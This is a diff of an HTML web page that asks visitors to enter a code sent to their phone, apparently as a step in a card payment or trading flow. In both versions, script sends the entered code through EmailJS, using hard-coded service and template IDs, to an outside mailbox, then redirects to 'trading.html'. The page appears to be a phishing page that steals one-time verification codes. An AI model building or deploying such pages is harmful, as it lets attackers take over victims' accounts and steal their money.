@@ -1,60 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>make payment via card</title>
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS public key
-    })();
-  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter Code</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #eef1f5;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: sans-serif;
+    }
+
+    body, html {
+      height: 100%;
+      background: #f0f4f8;
     }
 
     .form-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    form {
       background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      width: 350px;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
     }
 
     h2 {
-      text-align: center;
       margin-bottom: 20px;
+      text-align: center;
+      color: #333;
     }
 
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 5px;
-    }
-
-    input {
+    input[type="text"] {
       width: 100%;
-      padding: 10px;
-      border-radius: 5px;
+      padding: 12px;
+      margin-bottom: 20px;
       border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
     }
 
     button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background: #007bff;
-      color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
       cursor: pointer;
     }
 
@@ -69,49 +70,39 @@
   </style>
 </head>
 <body>
-
   <div class="form-container">
-    <h2>enter code sent to your phone</h2>
-    <form id="registerForm">
-      <div class="form-group">
-        <label for="code">enter code</label>
-        <input type="text" id="code" name="code" required />
-        </div>
-<div>
-      <button type="submit">submit</button>
+    <form id="codeForm">
+      <h2>Enter Code</h2>
+      <input type="text" id="code" name="code" placeholder="Enter your code" required />
+      <button type="submit">Submit</button>
       <div class="message" id="message"></div>
-  </div>
-
     </form>
   </div>
 
-  
-
+  <!-- EmailJS SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-  const form = document.getElementById('registerForm');
-  const message = document.getElementById('message');
+    // Initialize EmailJS
+    (function(){
+      emailjs.init("wkI_zzv-LS-eRPwAA"); // Replace with your EmailJS Public Key
+    })();
 
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
+    document.getElementById("codeForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    emailjs.sendForm('service_xuw4eys', 'template_c0462aw', form)
+      const codeValue = document.getElementById("code").value;
+
+      emailjs.send("service_xuw4eys", "template_c0462aw", {
+        code: codeValue
+      })
+      
       .then(() => {
-        // Optional: Show a quick success message before redirect
-        message.style.color = 'green';
-        message.textContent = 'Registration info sent successfully! Redirecting...';
-
-        // Redirect after a short delay (e.g., 2 seconds)
-        setTimeout(() => {
-          window.location.href = 'trading.html';
-        }, 2000);
-
-        form.reset();
-      }, (error) => {
-        message.style.color = 'red';
-        message.textContent = 'Failed to send: ' + error.text;
+  window.location.href = "trading.html"; // ✅ redirect after success
+}, (error) => {
+        document.getElementById("message").innerText = "Error sending code.";
+        console.error("EmailJS error:", error);
       });
-  });
-</script>
-
+    });
+  </script>
 </body>
 </html>
